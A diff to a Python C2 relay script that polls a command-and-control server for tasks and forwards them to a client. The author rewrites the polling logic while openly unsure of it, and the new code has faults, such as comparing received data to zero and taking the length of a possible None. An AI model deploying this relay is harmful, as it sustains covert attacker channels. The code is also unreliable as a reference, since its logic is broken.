@@ -249,24 +249,52 @@ class establishedSession(object):
 		"""
 		Poll the c2 server for new tasks
 		"""
-		recvdTask = None
-		while recvdTask is None:
-			taskCheck = commonUtils.recvFrameFromC2(sock)
+		# recvdTask = None
+		# while recvdTask is None:
+		# 	taskCheck = commonUtils.recvFrameFromC2(sock)
 
-			if taskCheck == None:
-				# Sleep for x amount of time. If we didn't get anything, restarts the loop
-				if args.debug:
-					print (commonUtils.color("NO TASK RECIEVED, SLEEPING FOR ", status=False, yellow=True) + "%s seconds") % (str(IDLE_TIME))
-				sleep(IDLE_TIME)
-			else:
-				# Our data is already decoded, end the loop by assining it to recvdTask
-				recvdTask = taskCheck
-				if args.verbose:
-					print (commonUtils.color("Recieved new task from C2 server! ") + "(%s bytes)") % (str(len(recvdTask)))
-				if args.debug:
-					print (commonUtils.color("NEW TASK: ", status=False, yellow=True) + "%s") % (recvdTask)
+		# 	if taskCheck == None:
+		# 		# Sleep for x amount of time. If we didn't get anything, restarts the loop
+		# 		if args.debug:
+		# 			print (commonUtils.color("NO TASK RECIEVED, SLEEPING FOR ", status=False, yellow=True) + "%s seconds") % (str(IDLE_TIME))
+		# 		sleep(IDLE_TIME)
+		# 	else:
+		# 		# Our data is already decoded, end the loop by assining it to recvdTask
+		# 		recvdTask = taskCheck
+		# 		if args.verbose:
+		# 			print (commonUtils.color("Recieved new task from C2 server! ") + "(%s bytes)") % (str(len(recvdTask)))
+		# 		if args.debug:
+		# 			print (commonUtils.color("NEW TASK: ", status=False, yellow=True) + "%s") % (recvdTask)
 
-		return recvdTask
+		# return recvdTask
+
+		##
+
+		# Retrying this with the client's "check beacon" logic:
+		# again, I have no idea what I'm doing
+		##########
+		chunk = commonUtils.recvFrameFromC2(sock)
+		if chunk < 0:
+			if args.debug:
+				print (commonUtils.color("Attempted to read %d bytes from c2 server", status=False, yellow=True)) %(len(chunk))
+			# break # This should probably just return None or something
+			return None
+		else:
+			if args.debug:
+				if len(chunk) > 1:
+					print (commonUtils.color("Recieved %d bytes from c2 server", status=False, yellow=True)) % (len(chunk))
+				else:
+					print (commonUtils.color("Recieved empty task from c2 server", status=False, yellow=True))
+		if len(chunk) > 1:
+			if args.verbose:
+				print (commonUtils.color("Recieved new task from C2 server!") + "(%s bytes)") % (str(len(chunk)))
+			if args.debug:
+				print (commonUtils.color("NEW TASK: ", status=False, yellow=True) + "%s") % (chunk)
+		return chunk
+
+		##########
+
+
 
 	#def checkForResponse(sock):
 	@staticmethod
@@ -365,12 +393,15 @@ def main():
 
 			newTask = establishedSession.checkForTasks(sock)
 
-			# once we have a new task, lets relay that to our client
-			if args.debug:
-				print commonUtils.color("Encoding and relaying task to client", status=False, yellow=True)
-			establishedSession.relayTask(newTask)
+			if len(newTask) > 1:
+				# once we have a new task, lets relay that to our client
+				if args.debug:
+					print commonUtils.color("Encoding and relaying task to client", status=False, yellow=True)
+				establishedSession.relayTask(newTask)
+			else:
+				break #DEBUG, not sure if this is right? If we don't recieve a task, we shouldn't be expecting a response?
 
-			# Now retrieve a response from the client
+			# Attempt to retrieve a response from the client
 			# TODO: Probably need logic to handle large/chunked responses
 			if args.verbose:
 				print commonUtils.color("Checking the client for a response...")
